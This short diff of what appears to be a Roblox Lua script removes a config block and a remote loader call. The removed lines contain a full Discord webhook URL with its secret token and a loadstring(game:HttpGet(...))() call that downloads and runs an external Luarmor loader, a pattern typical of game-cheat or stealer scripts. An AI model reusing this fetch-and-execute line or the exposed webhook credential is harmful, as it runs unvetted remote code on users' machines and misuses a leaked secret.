@@ -9,8 +9,3 @@ end
 _G.SCRIPT4 = true
 
 -- Script của bạn
-getgenv().Config = {
-    ["Webhook"] = "https://discord.com/api/webhooks/1324537338000310353/7z92hfz9o1h3HwsX4pVdoGVYpfKU2dx495X30wI4zwgEdYP0AXZ3Z5WG2skYsy0_p7Nj",
-    ["UserID"] = "1263292904953217072",
-}
-loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/e43eeb29211cc04ff3dad8003ed8deaa.lua"))()
